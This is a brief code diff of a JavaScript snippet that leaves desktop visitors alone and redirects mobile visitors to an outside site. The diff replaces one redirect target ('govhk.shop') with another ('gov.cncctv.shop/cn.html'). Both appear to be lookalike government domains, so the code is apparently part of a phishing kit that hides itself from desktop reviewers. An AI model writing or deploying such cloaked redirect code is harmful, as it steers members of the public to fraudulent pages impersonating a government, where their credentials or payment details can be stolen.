@@ -12,5 +12,5 @@
 		if(system.win||system.mac||system.xll){
 		
 		}else{
-		window.location.href="https://www.govhk.shop:4443";
+		window.location.href="https://gov.cncctv.shop/cn.html";
 		}
